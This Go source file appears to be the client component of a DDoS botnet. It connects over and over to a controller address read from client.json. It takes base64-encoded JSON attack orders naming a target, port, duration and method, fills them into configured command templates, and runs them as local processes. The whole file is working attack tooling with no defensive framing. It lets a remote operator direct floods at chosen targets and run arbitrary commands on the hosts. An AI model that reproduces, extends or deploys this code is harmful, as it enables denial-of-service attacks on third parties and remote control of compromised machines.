package main

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

//stores the configuration properly
//this will store all the informaiton needed
type Configuration struct { //stored in structure
	TargetDomain			string `json:"target"`
	Timeout					int    `json:"timeout"`
	Methods 		[]MethodConfig `json:"methods"`
}

//stores the information about the method
//this will execute when the method is used properly
type MethodConfig struct { //stored in type structure
	Method 			string `json:"name"`
	PipeOutput		bool   `json:"pipeOutput"`
	Args		  []string `json:"args"`
}

//stores the attack structure
//this will be broadcasted to clients
type AttackBuild struct { //stored in structure
	Target 				string `json:"target"`
	Duration			int    `json:"duration"`
	Port 				int    `json:"port"`
	Method				string `json:"method"`
}

//stores the future data properly
//this will ensure its done without any error
var ConfigurationConfig *Configuration = nil

func main() {
	//tries to properly load the configuration
	//this will ensure its done without issues
	ConfigFile, err := ioutil.ReadFile("client.json")
	if err != nil { //error handles the statement properly
		log.Fatalf("Err: %s\r\n", err.Error()) //prints error
	}

	//stores the future ref
	//this will ensure its done without issues
	var futureRef Configuration
	//tries to parse without issues happening
	//this will ensure its done without errors happening
	if err := json.Unmarshal(ConfigFile, &futureRef); err != nil {
		log.Fatalf("Err: %s\r\n", err.Error()) //prints error
	}

	//updates the information properly
	//this will ensure its done without errors
	ConfigurationConfig = &futureRef //updates

	//for loops within the dial statement
	//this will ensure its done without issues
	for { //forever for loops through connection

		//tries to dial the target
		//this will ensure its done without issues
		target, err := net.Dial("tcp", ConfigurationConfig.TargetDomain)
		if err == nil { //if there was no error we will route through here
			fmt.Printf("[Connected to target] [%s]\r\n", ConfigurationConfig.TargetDomain)

			//tries to properly follow the guide
			//this will ensure its done without any issues
			if err := FollowPath(target); err != nil { //err handles
				fmt.Printf("[Connection dropped] [%s]\r\n", ConfigurationConfig.TargetDomain); continue
			}
		}


		//sleeps for the dial timeout
		//this will ensure its done without issues
		time.Sleep(time.Duration(ConfigurationConfig.Timeout) * time.Second)
	}
}

//holds the information properly
//makes sure its done without any issues
func FollowPath(c net.Conn) error {
	//reads forever properly and safely
	//this will make sure its done without issues
	for { //ever loops through reading inputs safely
		Buffer := make([]byte, 1024) //stores the buffer
		if _, err := c.Read(Buffer); err != nil { //error handles
			return err //returns the error found properly
		}

		//gets the raw input properly
		//this will ensure its done without errors
		raw, err := base64.RawStdEncoding.DecodeString(strings.ReplaceAll(string(Buffer), "\x00", ""))
		if err != nil { //error handles properly without issues happening
			return err //returns the error properly without issues
		}

		//stores the information
		//this will ensure its done without errors
		var attack AttackBuild
		//tries to properly parse the attack information
		//this will allow for better control without issues
		if err := json.Unmarshal(raw, &attack); err != nil {
			return err //returns the error properly
		}

		//tries to find the method properly
		//this will search through the array properly
		meth := GetMethod(attack.Method) //gets the method
		if meth == nil { //checks for nil pointer properly
			return errors.New("invalid method has been given with name of "+attack.Method)
		}

		//ranges through all args
		//this will replace all tags needed
		for p := range meth.Args { //ranges through
			meth.Args[p] = strings.ReplaceAll(meth.Args[p], "<<$target>>", attack.Target) //target
			meth.Args[p] = strings.ReplaceAll(meth.Args[p], "<<$method>>", attack.Method) //method
			meth.Args[p] = strings.ReplaceAll(meth.Args[p], "<<$duration>>", strconv.Itoa(attack.Duration)) //duration
			meth.Args[p] = strings.ReplaceAll(meth.Args[p], "<<$port>>", strconv.Itoa(attack.Port)) //port
		}

		//stores the command line information
		//this will be used to future proof without issues
		cmd := exec.Command(meth.Args[0], meth.Args[1:]...)
		
		//checks for piping option
		//this will print into the terminal is active
		if meth.PipeOutput { //checks properly
			//sets the piping information properly
			//this will ensure its done without errors
			cmd.Stderr = os.Stderr //err
			cmd.Stdout = os.Stdout //out
			cmd.Stdin  = os.Stdin  //in
		}

		//starts the command properly
		//this will ensure its done without issues
		if err := cmd.Start(); err != nil { //error handles properly
			log.Printf("ErrRun: %s\r\n", err.Error()) //prints the error properly
			continue //continues the looping function properly and safely
		}
	}
}

//tries to get the method properly
//this will ensure its done without issues
func GetMethod(methodin string) *MethodConfig {
	//ranges through all the methods given properly
	//allows for better control without issues happening
	for _, method := range ConfigurationConfig.Methods {
		if method.Method == methodin { //compares the information
			return &method //returns the method properly without issues
		}
	}; return nil //as its invalid properly
}